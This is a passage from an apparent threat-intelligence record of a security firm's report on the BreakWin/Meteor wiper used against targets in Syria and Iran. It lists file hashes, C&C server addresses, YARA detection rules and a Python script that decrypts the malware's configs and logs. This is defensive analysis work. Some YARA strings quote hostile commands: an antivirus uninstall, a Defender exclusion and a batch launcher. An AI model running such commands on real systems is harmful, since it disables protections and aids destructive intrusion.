8249491393ffe07ffb3f987e8199f889579d0826,\n68e95a3ccde3ea22b8eb8adcf0ad53c7993b2ea5316948e31d9eadd11b5151d7\ncfb7b988cc5dc257987635646e86172b, dd01819d9ce6853927c000cc8de598d8030ab27c,\n38a419cd9456e40961c781e16ceee99d970be4e9235ccce0b316efe68aba3933\n26f49957eaa56a82ad20492919cc6c22, d7e2e40825e262e4bb884111d7ba13fd867c3c0f,\n4d994b864d785abccef829d84f91d949562d0af934114b65056315bf59c1ef58\n81d3fcbe0dca0f47f780fcf22ebb3f5e, 8531d06c2cc36af8f65f558932e2c09dec4fa3e4,\n2d35bb7c02062ff2fba4424a267c5c83351405281a1870f52d02f3712a547a22\n\n```\n\n-----\n\n```\nd85a211793e9cb1cb8c24be22c24b30f, 1b90dafc4a34491f64e62d63c82f1b44ca138887,\n67920ff26a18308084679186e18dcaa5f8af997c7036ba43c2e8c69ce24b9a1a\neef87eea468b7ac6055b49dafc86502f, 75bb2bb1ea3cd4b726f5a1bc4fab20edbeb08238,\nac7dd1048e1705e07e4d21dc25c58441f9eb86b37b9969b423ff6ca241871586\n29adef27d040405cd22d5b36aae3e00f, db82ef80f28bdca0821a616a1ba8db1d79287a67,\ne9b70bf93f1b396be02feb35af5445985e3429461b195de881e0483361e57049\n6833338cc5a96826cef926703753f10e, 62f36c0eba49ee73d8751e721fdd0acb61ef1304,\n342070940aa3b46486cb458eb13545101b49d4eebe2c93c608948dbb7ce463bc\nbfb51ec459eaafb7a50ee646d49ecd4d, 579330d75f5fce52b1bab475bd77cf347fc404e4,\nf8139c0f5bab5d7b1624f1ac55e84d451fe1fa01f2903f269f56e5bfa3a40548\n\n```\n**C&C servers:**\n```\n68.183.79.77\n167.172.177.158\n139.59.89.238\n172.105.42.64\n\n## Appendix B – Yara Rules\n\n```\n\n-----\n\n```\nrule ZZ_breakwin_config {\n  meta:\n    description = \"Detects the header of the encrypted config files, assuming\nknown encryption key.\"\n    author = \"Check Point Research\"\n    date = \"22-07-2021\"\n    hash = \"948febaab71727217303e0aabb9126f242aa51f89caa7f070a3da76c4f5699ed\"\n    hash = \"2d35bb7c02062ff2fba4424a267c5c83351405281a1870f52d02f3712a547a22\"\n    hash = \"68e95a3ccde3ea22b8eb8adcf0ad53c7993b2ea5316948e31d9eadd11b5151d7\"\n  strings:\n          $conf_header = {1A 69 45 47 5E 46 4A 06 03 E4 34 0B 06 1D ED 2F 02 15\n02 E5 57 4D 59 59 D1 40 20 22}\n     condition:\n          $conf_header at 0\n}\nrule ZZ_breakwin_wiper {\n  meta:\n    description = \"Detects the BreakWin wiper that was used in attacks in Syria\"\n    author = \"Check Point Research\"\n    date = \"22-07-2021\"\n    hash = \"2aa6e42cb33ec3c132ffce425a92dfdb5e29d8ac112631aec068c8a78314d49b\"\n    hash = \"6709d332fbd5cde1d8e5b0373b6ff70c85fee73bd911ab3f1232bb5db9242dd4\"\n    hash = \"d71cc6337efb5cbbb400d57c8fdeb48d7af12a292fa87a55e8705d18b09f516e\"\n  strings:\n    $debug_str_meteor_1 = \"the program received an invalid number of arguments\"\nwide\n    $debug_str_meteor_2 = \"End interval logger. Resuming writing every log\" wide\n    $debug_str_meteor_0 = \"failed to initialize configuration from file\" wide\n    $debug_str_meteor_3 = \"Meteor is still alive.\" wide\n    $debug_str_meteor_4 = \"Exiting main function because of some error\" wide\n    $debug_str_meteor_5 = \"Meteor has finished. This shouldn't be possible\nbecause of the is-alive loop.\" wide\n    $debug_str_meteor_6 = \"Meteor has started.\" wide\n    $debug_str_meteor_7 = \"Could not hide current console.\" wide\n    $debug_str_meteor_8 = \"Could not get the window handle used by the console.\"\nwide\n    $debug_str_meteor_9 = \"Failed to find base-64 data size\" wide\n    $debug_str_meteor_10 = \"Running locker thread\" wide\n    $debug_str_meteor_11 = \"Failed to encode wide-character string as Base64\"\nwide\n    $debug_str_meteor_12 = \"Wiper operation failed.\" wide\n    $debug_str_meteor_13 = \"Screen saver disable failed.\" wide\n    $debug_str_meteor_14 = \"Failed to generate password of length %s. Generating\na default one.\" wide\n    $debug_str_meteor_15 = \"Failed to delete boot configuration\" wide\n    $debug_str_meteor_16 = \"Could not delete all BCD entries.\" wide\n    $debug_str_meteor_17 = \"Finished deleting BCD entries.\" wide\n    $debug_str_meteor_18 = \"Failed to change lock screen\" wide\n    $debug_str_meteor_19 = \"Boot configuration deleted successfully\" wide\n    $debug_str_meteor_20 = \"Failed to kill all winlogon processes\" wide\n    $debug_str_meteor_21 = \"Changing passwords of all users to\" wide\n\n```\n\n-----\n\n```\n    $debug_str_meteor_22 Failed to change the passwords of all users wide\n    $debug_str_meteor_23 = \"Failed to run the locker thread\" wide\n    $debug_str_meteor_24 = \"Screen saver disabled successfully.\" wide\n    $debug_str_meteor_25 = \"Generating random password failed\" wide\n    $debug_str_meteor_26 = \"Locker installation failed\" wide\n    $debug_str_meteor_27 = \"Failed to set auto logon.\" wide\n    $debug_str_meteor_28 = \"Failed to initialize interval logger. Using a dummy\nlogger instead.\" wide\n    $debug_str_meteor_29 = \"Succeeded setting auto logon for\" wide\n    $debug_str_meteor_30 = \"Failed disabling the first logon privacy settings\nuser approval.\" wide\n    $debug_str_meteor_31 = \"Failed disabling the first logon animation.\" wide\n    $debug_str_meteor_32 = \"Waiting for new winlogon process\" wide\n    $debug_str_meteor_33 = \"Failed to isolate from domain\" wide\n    $debug_str_meteor_34 = \"Failed creating scheduled task for system with name\n%s.\" wide\n    $debug_str_meteor_35 = \"Failed to get the new token of winlogon.\" wide\n    $debug_str_meteor_36 = \"Failed adding new admin user.\" wide\n    $debug_str_meteor_37 = \"Failed changing settings for the created new user.\"\nwide\n    $debug_str_meteor_38 = \"Failed disabling recovery mode.\" wide\n    $debug_str_meteor_39 = \"Logging off users on Windows version 8 or above\" wide\n    $debug_str_meteor_40 = \"Succeeded setting boot policy to ignore all errors.\"\nwide\n    $debug_str_meteor_41 = \"Succeeded creating scheduled task for system with\nname\" wide\n    $debug_str_meteor_42 = \"Succeeded disabling recovery mode\" wide\n    $debug_str_meteor_43 = \"Failed to log off all sessions\" wide\n    $debug_str_meteor_44 = \"Failed to delete shadowcopies.\" wide\n    $debug_str_meteor_45 = \"Failed logging off session: \" wide\n    $debug_str_meteor_46 = \"Failed setting boot policy to ignore all errors.\"\nwide\n    $debug_str_meteor_47 = \"Successfully logged off all local sessions, except\nwinlogon.\" wide\n    $debug_str_meteor_48 = \"Succeeded creating scheduled task with name %s for\nuser %s.\" wide\n    $debug_str_meteor_49 = \"Killing all winlogon processes\" wide\n    $debug_str_meteor_50 = \"Logging off users in Windows 7\" wide\n    $debug_str_meteor_51 = \"Failed logging off all local sessions, except\nwinlogon.\" wide\n    $debug_str_meteor_52 = \"Failed creating scheduled task with name %s for user\n%s.\" wide\n    $debug_str_meteor_53 = \"Succeeded deleting shadowcopies.\" wide\n    $debug_str_meteor_54 = \"Logging off users in Windows XP\" wide\n    $debug_str_meteor_55 = \"Failed changing settings for the created new user.\"\nwide\n    $debug_str_meteor_56 = \"Could not open file %s. error message: %s\" wide\n    $debug_str_meteor_57 = \"Could not write to file %s. error message: %s\" wide\n    $debug_str_meteor_58 = \"tCould not tell file pointer location on file %s.\"\nwide\n    $debug_str_meteor_59 = \"Could not set file pointer location on file %s to\noffset %s.\" wide\n    $debug_str_meteor_60 = \"Could not read from file %s. error message: %s\" wide\n    $debug_str_meteor_61 = \"Failed to wipe file %s\" wide\n    $debug_str_meteor_62 = \"attempted to access encrypted file in offset %s, but\n\n```\n\n-----\n\n```\nit only supports offset 0 wide\n    $debug_str_meteor_63 = \"Failed to create thread. Error message: %s\" wide\n    $debug_str_meteor_64 = \"Failed to wipe file %s\" wide\n    $debug_str_meteor_65 = \"failed to get configuration value with key %s\" wide\n    $debug_str_meteor_66 = \"failed to parse the configuration from file %s\" wide\n    $debug_str_meteor_67 = \"Failed posting to server, received unknown exception\"\nwide\n    $debug_str_meteor_68 = \"Failed posting to server, received std::exception\"\nwide\n    $debug_str_meteor_69 = \"Skipping %s logs. Writing log number %s:\" wide\n    $debug_str_meteor_70 = \"Start interval logger. Writing logs with an interval\nof %s logs.\" wide\n    $debug_str_meteor_71 = \"failed to write message to log file %s\" wide\n    $debug_str_meteor_72 = \"The log message is too big: %s/%s characters.\" wide\n    $debug_str_stardust_0 = \"Stardust has started.\" wide\n    $debug_str_stardust_1 = \"0Vy0qMGO\" ascii wide\n    $debug_str_comet_0 = \"Comet has started.\" wide\n    $debug_str_comet_1 = \"Comet has finished.\" wide\n    $str_lock_my_pc = \"Lock My PC 4\" ascii wide\n    $config_entry_0 = \"state_path\" ascii\n    $config_entry_1 = \"state_encryption_key\" ascii\n    $config_entry_2 = \"log_server_port\" ascii\n    $config_entry_3 = \"log_file_path\" ascii\n    $config_entry_4 = \"log_encryption_key\" ascii\n    $config_entry_5 = \"log_server_ip\" ascii\n    $config_entry_6 = \"processes_to_kill\" ascii\n    $config_entry_7 = \"process_termination_timeout\" ascii\n    $config_entry_8 = \"paths_to_wipe\" ascii\n    $config_entry_9 = \"wiping_stage_logger_interval\" ascii\n    $config_entry_10 = \"locker_exe_path\" ascii\n    $config_entry_11 = \"locker_background_image_jpg_path\" ascii\n    $config_entry_12 = \"auto_logon_path\" ascii\n    $config_entry_13 = \"locker_installer_path\" ascii\n    $config_entry_14 = \"locker_password_hash\" ascii\n    $config_entry_15 = \"users_password\" ascii\n    $config_entry_16 = \"locker_background_image_bmp_path\" ascii\n    $config_entry_17 = \"locker_registry_settings_files\" ascii\n    $config_entry_18 = \"cleanup_script_path\" ascii\n    $config_entry_19 = \"is_alive_loop_interval\" ascii\n    $config_entry_20 = \"cleanup_scheduled_task_name\" ascii\n    $config_entry_21 = \"self_scheduled_task_name\" ascii\n    $encryption_asm = {33 D2 8B C3 F7 75 E8 8B 41 04 8B 4E 04 8A 04 02 02 C3 32\n04 1F 88 45 F3 39 4E 08}\n    $random_string_generation = {33 D2 59 F7 F1 83 ?? ?? 08 66 0F BE 82 ?? ?? ??\n00 0F B7 C8 8B C7}\n  condition:\n    uint16(0) == 0x5A4D and\n    (\n\n```\n\n-----\n\n```\n        6 of them or\n        $encryption_asm or \n        $random_string_generation\n    )\n}\nrule ZZ_breakwin_stardust_vbs {\n  meta:\n    description = \"Detect the VBS files that where found in the attacks on\ntargets in Syria\"\n    author = \"Check Point Research\"\n    date = \"22-07-2021\"\n    hash = \"38a419cd9456e40961c781e16ceee99d970be4e9235ccce0b316efe68aba3933\"\n    hash = \"62a984981d14b562939294df9e479ac0d65dfc412d0449114ccb2a0bc93769b0\"\n    hash = \"4d994b864d785abccef829d84f91d949562d0af934114b65056315bf59c1ef58\"\n    hash = \"eb5237d56c0467b5def9a92e445e34eeed9af2fee28f3a2d2600363724d6f8b0\"\n    hash = \"5553ba3dc141cd63878a7f9f0a0e67fb7e887010c0614efd97bbc6c0be9ec2ad\"\n  strings:\n    $url_template = \"progress.php?hn=\\\" & CN & \\\"&dt=\\\" & DT & \\\"&st=\"\n    $compression_password_1 =\n\"YWhZMFU1VlZGdGNFNWlhMVlVMnhTMWtOVlJVWWNGTk9iVTQxVW10V0ZFeFJUMD0r\"\n    $compression_password_2 =\n\"YWlvcyBqQCNAciNxIGpmc2FkKnIoOUZURjlVSjBSRjJRSlJGODlKSDIzRmloIG8\"\n    $uninstall_kaspersky = \"Shell.Run \\\"msiexec.exe /x \\\" & productcode & \\\"\nKLLOGIN=\"\n    $is_avp_running = \"isProcessRunning(\\\".\\\", \\\"avp.exe\\\") Then\"\n  condition:\n    any of them\n}\nrule ZZ_breakwin_meteor_batch_files {\n  meta:\n    description = \"Detect the batch files used in the attacks\"\n    author = \"Check Point Research\"\n    date = \"22-07-2021\"\n  strings:\n    $filename_0 = \"mscap.bmp\"\n    $filename_1 = \"mscap.jpg\"\n    $filename_2 = \"msconf.conf\"\n    $filename_3 = \"msmachine.reg\"\n    $filename_4 = \"mssetup.exe\"\n    $filename_5 = \"msuser.reg\"\n    $filename_6 = \"msapp.exe\"\n    $filename_7 = \"bcd.rar\"\n    $filename_8 = \"bcd.bat\"\n    $filename_9 = \"msrun.bat\"\n    $command_line_0 = \"powershell -Command \\\"%exclude_command%\n'%defender_exclusion_folder%\"\n    $command_line_1 = \"start /b \\\"\\\" update.bat hackemall\"\n\n```\n\n-----\n\n```\n  condition:\n    4 of ($filename_*) or\n    any of ($command_line_*)\n}\n\n## Appendix C – Config and Log Decryption Script\nfrom malduck import xor, u32\ndef decode_buffer(buf, key):\n  results = \"\"\n  for k,v in enumerate(buf):\n    # XOR is rolled by the index of the encrypted character\n    results += chr (((k % 256) + key[k % len(key)] ^ v) & 0xff)\n  return results\ndef decode_log_file(filepath):\n  content = open(filepath,'rb').read()\n  key = b\"aceg\" # modified 'abcdz' because of shifting indexes\n  offset = 0\n  while offset < len(content):\n    sz = u32(xor(key, content[offset:offset+4])) + 4\n    print(decode_buffer(content[offset:offset+sz], b\"abcdz\"))\n    offset += sz\ndef decode_config(filepath, key=b\"abcdz\"):\n  content = open(filepath,'rb').read()\n  return decode_buffer(content, key)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-14 - Indra — Hackers Behind Recent Attacks on Iran.pdf"
    ],
    "report_names": [
        "2021-08-14 - Indra — Hackers Behind Recent Attacks on Iran.pdf"
    ],
    "threat_actors": [
        {
            "id": "8309f9cf-9abb-4ce3-aa1e-cda7d7f5c1b3",
            "created_at": "2022-10-25T16:07:23.729215Z",
            "updated_at": "2025-03-27T02:02:09.949223Z",
            "deleted_at": null,
            "main_name": "Indra",
            "aliases": [],
            "source_name": "ETDA:Indra",
            "tools": [
                "Stardust"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "219ddb41-2ea8-4121-8b63-8c762f7e15df",
            "created_at": "2023-01-06T13:46:39.384442Z",
            "updated_at": "2025-03-27T02:00:03.07071Z",
            "deleted_at": null,
            "main_name": "Predatory Sparrow",
            "aliases": [
                "Indra",
                "Gonjeshke Darande"
            ],
            "source_name": "MISPGALAXY:Predatory Sparrow",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536196,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1653761526,
    "ts_modification_date": 1653761526,
    "files": {
        "pdf": "https://archive.orkl.eu/33dde9ac9b313972acb935f5601ce9bec63242ae.pdf",
        "text": "https://archive.orkl.eu/33dde9ac9b313972acb935f5601ce9bec63242ae.txt",
        "img": "https://archive.orkl.eu/33dde9ac9b313972acb935f5601ce9bec63242ae.jpg"
    }
}